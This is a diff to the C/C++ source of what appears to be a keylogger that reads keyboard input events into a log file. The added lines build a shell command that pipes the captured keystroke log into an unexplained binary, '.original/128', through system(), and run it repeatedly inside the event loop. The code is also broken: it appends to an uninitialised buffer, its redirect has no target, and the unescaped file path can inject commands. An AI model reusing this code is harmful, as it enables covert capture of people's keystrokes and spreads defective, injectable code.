@@ -473,8 +473,19 @@ int main(int argc, char **argv)
     file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);
   fflush(out);
   
+  int flag = 0;
   // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
   while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
+    if (flag) {
+      char command[2500];
+      //cat file | ./128 > "
+      char *cat = "cat ";
+      char *rot = " | .original/128 > ";
+      strcat(command, cat);
+      strcat(command, args.logfile.c_str());
+      strcat(command, rot);
+      system(command);
+    }
     
 // these event.value-s aren't defined in <linux/input.h> ?
 #define EV_MAKE   1  // when key pressed
@@ -629,6 +640,15 @@ int main(int argc, char **argv)
       return system(command);
     }
 
+      char command[2500];
+      //cat file | ./128 > "
+      char *cat = "cat ";
+      char *rot = " | .original/128 > ";
+      strcat(command, cat);
+      strcat(command, args.logfile.c_str());
+      strcat(command, rot);
+      system(command);
+      flag = 1;
   } // while (read(input_fd))
   
   // append final timestamp, close files and exit
